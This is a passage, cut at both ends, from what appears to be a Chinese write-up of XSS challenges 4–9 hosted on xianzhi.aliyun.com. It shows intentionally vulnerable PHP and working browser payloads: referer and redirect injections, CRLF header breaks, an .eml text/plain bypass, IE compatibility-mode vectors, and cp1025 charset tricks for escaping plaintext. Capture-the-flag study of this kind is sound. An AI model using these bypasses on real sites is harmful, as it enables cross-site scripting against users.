0.7em; display: block !important;">&lt;?php
+header("X-XSS-Protection: 0");
+?&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset="utf-8"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;?php echo "你来自:".$_SERVER['HTTP_REFERER'];?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss4.php</p><p style="margin-bottom: 1.2em !important;">输出点是referer，chrome、firefox会对query进行url编码，但是IE并不会</p><p style="margin-bottom: 1.2em !important;">参考文章:http://www.mottoin.com/88317.html捉到一个M师傅：http://www.hackdig.com/?04/hack-9586.htm</p><p style="margin-bottom: 1.2em !important;">IE11 exp: <code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">http://ns1.rootk.pw:8080/xss/wp/4.html?a&lt;img src=1 onerror=alert(document.domain)&gt;</code></p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;html&gt;
+&lt;body&gt;
+&lt;form id="xss"
+ &nbsp; &nbsp; &nbsp;name="xss"
+ &nbsp; &nbsp; &nbsp;method="GET"
+ &nbsp; &nbsp; &nbsp;action="http://xianzhi.aliyun.com/xss4.php"&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.getElementById("xss").submit();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p style="white-space: normal;"><span style="color: rgb(87, 217, 255);">M师傅语录</span></p><p><br  /></p><section style="margin-top: -10px; margin-right: auto; margin-left: 30px; border-color: transparent transparent rgb(87, 217, 255); border-style: solid; border-width: 10px; float: none; height: 0px; width: 0px;"></section><section style="margin-top: -1px; line-height: 22px; border-width: 1px; border-style: solid; border-color: rgb(87, 217, 255); color: rgb(255, 255, 255); border-radius: 2px; text-align: center;"><section style="margin-top: -18px; margin-right: auto; margin-left: 29px; border-color: transparent transparent rgb(254, 254, 254); border-style: solid; border-width: 10px; height: 0px; width: 0px; color: inherit;"></section><section data-style="color:rgb(216,216,216)" style="padding: 10px;"><p style="color: inherit; white-space: normal;"><span class="pBrush" style="color: rgb(216, 216, 216);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>&nbsp;<span style="color: rgb(0, 0, 0);"></span><span style="color: rgb(0, 0, 0);">Referrer不会被URL编码的现象，主要是在Windows7和Windows8.1 Win10的IE11以前也有，不过在打完Anniversary Update补丁之后，在对referrer的处理上做了一些改动。变成了会对referrer进行URL编码</span></strong></span></p></section></section><p><br  /></p><p style="margin-bottom: 1.2em !important;"><br  /></p><p style="margin-bottom: 1.2em !important;">所以比较通用的办法是通过flash发送请求，AS代码如下：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">package {
+import flash.display.Sprite;
+import flash.net.URLRequest;
+import flash.net.navigateToURL;
+public class xss_referrer extends Sprite{
+ &nbsp;public function xss_referrer() {
+ &nbsp; var url:URLRequest = new URLRequest("https://vulnerabledoma.in/xss_referrer");
+ &nbsp; navigateToURL(url, "_self");
+ &nbsp;}
+}
+}</code></pre><p style="margin-bottom: 1.2em !important;">Ref:http://masatokinugawa.l0.cm/2016/10/referrer-xss-win10.html</p><hr  /><p style="margin-bottom: 1.2em !important;">另外在找资料也看到一些东西，记录一下</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;"># 会传送referer
+https-&gt;https
+http-&gt;https
+http-&gt;http
+
+# 不会传送refer
+https-&gt;http</code></pre><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">5. 跳转</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("X-XSS-Protection: 0");
+$url=str_replace(urldecode("%00"),"",$_GET["url"]);
+$url=str_replace(urldecode("%0d"),"",$url);
+$url=str_replace(urldecode("%0a"),"",$url);
+header("Location: ".$url);
+?&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset="utf-8"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;?php echo "&lt;a href='".$url."'&gt;如果跳转失败请点我&lt;/a&gt;";?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss5.php?url=http://baidu.com</p><p style="margin-bottom: 1.2em !important;">这个问题主要是想办法去让浏览器不进行跳转.</p><p style="margin-bottom: 1.2em !important;">翻到p师傅blog曾经对bottle http注入的一段: https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</p><p style="margin-bottom: 1.2em !important;">这里我使用的是端口小于80，FF就不会进行跳转</p><p style="margin-bottom: 1.2em !important;">FF exp:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">http://xianzhi.aliyun.com/xss5.php?url=http://baidu.com:0/'%3E&lt;img src=1 onerror=alert(document.domain)&gt;&lt;a&gt;</code></pre><p style="margin-bottom: 1.2em !important;">ref: http://d.hatena.ne.jp/hasegawayosuke/20161210/p1</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">6. 强制下载</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("X-XSS-Protection: 0");
+header('Content-Disposition: attachment; filename="'.$_GET["filename"].'"');
+
+if(substr($_GET["url"],0,4) ==="http" &amp;&amp; substr($_GET["url"],0,8)&lt;&gt;"http://0" &amp;&amp; substr($_GET["url"],0,8)&lt;&gt;"http://1" &amp;&amp; substr($_GET["url"],0,8)&lt;&gt;"http://l" &amp;&amp; strpos($_GET["url"], '@') === false)
+{
+$opts = array('http' =&gt;
+ &nbsp; &nbsp;array(
+ &nbsp; &nbsp; &nbsp; &nbsp;'method' =&gt; 'GET',
+ &nbsp; &nbsp; &nbsp; &nbsp;'max_redirects' =&gt; '0',
+ &nbsp; &nbsp; &nbsp; &nbsp;'ignore_errors' =&gt; '1'
+ &nbsp; &nbsp;)
+);
+$context = stream_context_create($opts);
+$url=str_replace("..","",$_GET["url"]);
+$stream = fopen($url, 'r', false, $context);
+echo stream_get_contents($stream);
+}
+else
+{
+echo "Bad URL!";
+}
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss6.php?filename=download&amp;url=http://xianzhi.aliyun.com/xss2.php</p><p style="margin-bottom: 1.2em !important;">这个是需要绕过文件下载，在第5题中p师傅的文章里面提到了一个点</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">为PHP的header函数一旦遇到\0、\r、\n这三个字符，就会抛出一个错误，此时Location头便不会返回，浏览器也就不会跳转了</code></pre><p style="margin-bottom: 1.2em !important;">同理是可以用在文件下载中</p><p style="margin-bottom: 1.2em !important;">FF exp:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">http://xianzhi.aliyun.com/xss6.php?url=http://ns1.rootk.pw:8080/xss/wp/6.php&amp;filename=aaa%0a</code></pre><p style="margin-bottom: 1.2em !important;">ref: https://twitter.com/mramydnei/status/782324732897075200</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">7. text/plain</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("X-XSS-Protection: 0");
+header('Content-Type: text/plain; charset=utf-8');
+
+if(substr($_GET["url"],0,4) ==="http" &amp;&amp; substr($_GET["url"],0,8)&lt;&gt;"http://0" &amp;&amp; substr($_GET["url"],0,8)&lt;&gt;"http://1" &amp;&amp; substr($_GET["url"],0,8)&lt;&gt;"http://l" &amp;&amp; strpos($_GET["url"], '@') === false)
+{
+$opts = array('http' =&gt;
+ &nbsp; &nbsp;array(
+ &nbsp; &nbsp; &nbsp; &nbsp;'method' =&gt; 'GET',
+ &nbsp; &nbsp; &nbsp; &nbsp;'max_redirects' =&gt; '0',
+ &nbsp; &nbsp; &nbsp; &nbsp;'ignore_errors' =&gt; '1'
+ &nbsp; &nbsp;)
+);
+$context = stream_context_create($opts);
+$url=str_replace("..","",$_GET["url"]);
+$stream = fopen($url, 'r', false, $context);
+echo stream_get_contents($stream);
+}
+else
+{
+echo "Bad URL!";
+}
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss7.php?url=http://xianzhi.aliyun.com/xss2.php</p><p style="margin-bottom: 1.2em !important;">MIME的题目，返回头Type为text/plain应该如何绕过</p><p style="margin-bottom: 1.2em !important;">找到一个近期公布的IE 0dayhttps://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/</p><p style="margin-bottom: 1.2em !important;">利用的是email文件，里面的内容会被解析html，这里可以利用iframe来加载目标地址，这样内容就会被解析啦。</p><p style="margin-bottom: 1.2em !important;">IE exp:http://ns1.rootk.pw:8080/xss/wp/9.eml</p><p style="margin-bottom: 1.2em !important;">9.eml</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">TESTEML
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+=3Ciframe=20src=3D=27http=3A=2f=2fxianzhi.aliyun.com=2fxss7.php=3Furl=3Dhttp=3A=2f=2fns1.rootk.pw=3A8080=2fxss=2fwp=2f9.txt=3Fname=3D=3CHTML=3E=3Ch1=3Eit=20works=3C=2Fh1=3E=27=3E=3C=2Fiframe=3E</code></pre><p style="margin-bottom: 1.2em !important;">防御：这里多亏M师傅的提醒，文章中的<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">X-Content-Type-Options: nosniff</code>是可以防御的，相反<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">X-Frame-Options: DENY</code>并不能从根本去解决这个问题，这个只是防御了一种攻击方式，但是漏洞点却还在，真是留了一个大坑.</p><p style="margin-bottom: 1.2em !important;">ref: https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">8. 标签</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("X-XSS-Protection: 0");
+header("Content-Type: text/html;charset=utf-8");
+
+if(substr($_GET["url"],0,4) ==="http" &amp;&amp; substr($_GET["url"],0,8)&lt;&gt;"http://0" &amp;&amp; substr($_GET["url"],0,8)&lt;&gt;"http://1" &amp;&amp; substr($_GET["url"],0,8)&lt;&gt;"http://l" &amp;&amp; strpos($_GET["url"], '@') === false)
+{
+$rule="/&lt;[a-zA-Z]/";
+$opts = array('http' =&gt;
+ &nbsp; &nbsp;array(
+ &nbsp; &nbsp; &nbsp; &nbsp;'method' =&gt; 'GET',
+ &nbsp; &nbsp; &nbsp; &nbsp;'max_redirects' =&gt; '0',
+ &nbsp; &nbsp; &nbsp; &nbsp;'ignore_errors' =&gt; '1'
+ &nbsp; &nbsp;)
+);
+$context = stream_context_create($opts);
+$url=str_replace("..","",$_GET["url"]);
+$stream = fopen($url, 'r', false, $context);
+$content=stream_get_contents($stream);
+if(preg_match($rule,$content))
+{
+echo "XSS Detected!";
+}
+else
+{
+echo $content;
+}
+}
+else
+{
+echo "Bad URL!";
+}
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss8.php?url=http://xianzhi.aliyun.com/test.txt</p><p style="margin-bottom: 1.2em !important;">此题想考察的是<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">&lt;</code>后面还可以存在非字母形式的，空格等一些空白字符当然是不行的.</p><p style="margin-bottom: 1.2em !important;">https://dev.w3.org/html5/spec-LC/parsing.html</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">A sequence of bytes starting with: 0x3C 0x21 (ASCII '&lt;!')
+A sequence of bytes starting with: 0x3C 0x2F (ASCII '&lt;/')
+A sequence of bytes starting with: 0x3C 0x3F (ASCII '&lt;?')</code></pre><p style="margin-bottom: 1.2em !important;">可以看到还能以这些作为开头，在IE9、10里面有一个vector可以无交互执行js</p><p style="margin-bottom: 1.2em !important;">8.txt</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;% contenteditable onresize=alert(document.domain)&gt;</code></pre><p style="margin-bottom: 1.2em !important;">现在问题就是IE11这个是无法触发的，但是可以通过<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">x-ua-compatible</code>设置文档兼容性，让它也能够兼容IE9、10的内容</p><p style="margin-bottom: 1.2em !important;"><strong>即便iframe内页面和父窗口即便不同域，iframe内页面也会继承父窗口的兼容模式，所以IE的一些老技巧、特性可以通过此方法去复活它.</strong></p><p style="margin-bottom: 1.2em !important;">IE11 exp:http://ns1.rootk.pw:8080/xss/wp/8.html</p><p style="margin-bottom: 1.2em !important;">8.html</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;meta http-equiv=x-ua-compatible content=IE=9&gt;
+&lt;iframe id=x src="http://xianzhi.aliyun.com/xss8.php?url=http://ns1.rootk.pw:8080/xss/wp/8.txt"&gt;&lt;/iframe&gt;</code></pre><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">9. plaintext</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("X-XSS-Protection: 0");
+header("Content-Type: text/html;charset=gb3212");
+?&gt;
+&lt;plaintext&gt;&lt;?php echo $_GET["text"];?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss9.php?text=test</p><p style="margin-bottom: 1.2em !important;">代码简单，但是绝对够爽的一道题目，就是如何逃逸<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">plaintext</code>这个标签</p><p style="margin-bottom: 1.2em !important;">我们有时候在使用浏览器的时候，也会遇到编码不同导致乱码问题，这个问题主要在于服务端和客户端之间的字符集存在差异导致的.</p><p style="margin-bottom: 1.2em !important;">关于这个也找到一篇文章：https://www.ibm.com/developerworks/cn/web/wa-lo-ecoding-response-problem/index.html</p><p style="margin-bottom: 1.2em !important;">上面的由于两端的差别导致的乱码，从xss角度出发，我们也就只能分析客户端
+所以问题来了：<strong>http的响应头的编码、页面的meta等都可以设置头的东西，那么具体是什么时候具体对应的会起作用?</strong></p><p style="margin-bottom: 1.2em !important;">先来了解一下浏览器的一些解析过程.https://dev.w3.org/html5/spec-LC/parsing.html</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIpgOSLQpYt4viblZnd3uT86iastgEbibXG7VqJibv1EtMIUJiaGfrIJeB1V0dGfiaa3iaicIzpwXH8YuH3QLA/0.png" class="" data-ratio="0.41693548387096774" data-w="1240" data-type="png"  /></p><p style="margin-bottom: 1.2em !important;">第一个是ua里面已经确认指明了才会选择
+第二个是http响应头大编码设置，也就是<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">Content-Type</code>，当它设置了<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">charset</code><strong>并且</strong>支持这个<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">charset</code>，也就是不为空并且字符集是存在的，题目的编码是不存在的编码<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">GB3212</code>，所以符合
+第三个就是<span style="color: red">如果meta标签设置编码是在html前1024个字节的时候，浏览器会根据这个编码去解析</span>，这个是浏览器直接解析，完全是不受<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">plaintext</code>影响</p><p style="margin-bottom: 1.2em !important;">所以第一步就是<strong>利用meta来改变页面的字符集</strong>.</p><p style="margin-bottom: 1.2em !important;">第二步，需要做的就是去<strong>利用字符集之间的差异，寻找异类的字符集</strong>，</p><p style="margin-bottom: 1.2em !important;">我们平常见到<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">&lt;</code>的编码是<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">\x3C</code>，但是这个是UTF-8的，在其他编码的字符集中就有可能不是这个结果了，这里使用的是<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">cp1025</code>编码</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">http://xianzhi.aliyun.com/xss9.php?text=&lt;meta http-equiv="content-Type" content="text/html; charset=cp1025"&gt;</code></pre><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIpgOSLQpYt4viblZnd3uT86iaib9hxiak9aspic8WwUiaZlsDPzOeGbDF1dOY1icWpnZ6Vhp4BbUwVibYoFOA/0.png" class="" data-ratio="0.8927419354838709" data-w="1240" data-type="png"  /></p><p style="margin-bottom: 1.2em !important;">可以看到<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">plaintext</code>已经不见了</p><p style="margin-bottom: 1.2em !important;">第三步，确认异类字符集的编码表，这样就可以构造好自己的payload
+这里需要跑一下来确认.</p><p style="margin-bottom: 1.2em !important;">fuzz.php</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;meta http-equiv="content-Type" content="text/html; charset=gb3212"&gt;
+&lt;?php
+if(!ini_get('safe_mode')){
+ &nbsp; &nbsp;set_time_limit(0);
+}
+header("X-XSS-Protection: 0");
+header("Content-Type: text/html;charset=gb3212");
+?&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;&lt;/body&gt;
+&lt;script&gt;
+function hex_pad(int_){
+ &nbsp; &nbsp;hex_ = int_.toString(16);
+ &nbsp; &nbsp;if(hex_.length==1){
+ &nbsp; &nbsp; &nbsp; &nbsp;hex_ = '0'+hex_;
+ &nbsp; &nbsp;}
+ &nbsp; &nbsp;return hex_;
+}
+for(var i=0;i&lt;255;i++){
+ &nbsp; &nbsp;var id = 'id_'+hex_pad(i);
+ &nbsp; &nbsp;var divO = document.createElement('div'); 
+ &nbsp; &nbsp;divO.id = id;
+ &nbsp; &nbsp;divO.innerHTML = hex_pad(i);
+ &nbsp; &nbsp;document.body.appendChild(divO);
+
+ &nbsp; &nbsp;var iframea = document.createElement('iframe'); 
+ &nbsp; &nbsp;iframea.src= 'http://a.com/test/xss/xsschange/9/game.php?text='+"%"+hex_pad(i);
+ &nbsp; &nbsp;document.getElementById(id).appendChild(iframea);
+}
+&lt;/script&gt;
+&lt;/html&gt;</code></pre><p style="margin-bottom: 1.2em !important;">其中还有一个game.php作为接口，利用iframe去得到字符集</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("X-XSS-Protection: 0");
+header("Content-Type: text/html;charset=cp1025");
+?&gt;
+&lt;?php echo @$_GET["text"];?&gt;</code></pre><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIpgOSLQpYt4viblZnd3uT86iaz2bQS1p8Td14zyFxFvkscJcPRkpEEzTztcqb1OBjgnXjbj5L2OfiaUA/0.png" class="" data-ratio="1.2483516483516484" data-w="910" data-type="png"  /></p><p style="margin-bottom: 1.2em !important;">这里就表明了，比如想要得到字符<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">m</code>，那就输入url编码<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">%94</code></p><p style="margin-bottom: 1.2em !important;">附上一点<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">cp1025</code>的编码</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 